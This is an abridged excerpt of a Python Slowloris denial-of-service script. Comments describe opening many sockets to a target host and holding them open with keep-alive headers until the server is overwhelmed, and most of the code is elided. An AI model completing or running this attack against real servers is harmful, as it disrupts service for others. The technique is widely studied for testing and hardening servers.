...
# The following code below creates a connection to a specified IP address
# opens a specified number of sockets to overwhelm the server. The code is
# programmed to continuously keep opening sockets and sends a 
# keep-alive header for each request so they are not closed overloading the 
# server resulting in a DOS attack until the attack interrupted by user who
# who started
...
if not args.host:
    print("A Host IP address is required!")
    parser.print_help()
    sys.exit(1)
...
# Definition for sending payload.
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

#defines "keep-alive header" with paylaod.
...
# Agents used to created segmented http requests.
list_of_sockets = []
user_agents = [
...
# defines sockets with necessary attributes.
...
# Defines slowloris attack allowing to keep sending headers and
# keeping specified sockets open.
def slowloris_iteration():
    ...
    # Some sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace until reached desired number.
...
def main():
    ...
    # Looks for user keyboard interruption to stop attack
    # example: control C.
    while True:
        try:
            slowloris_iteration()
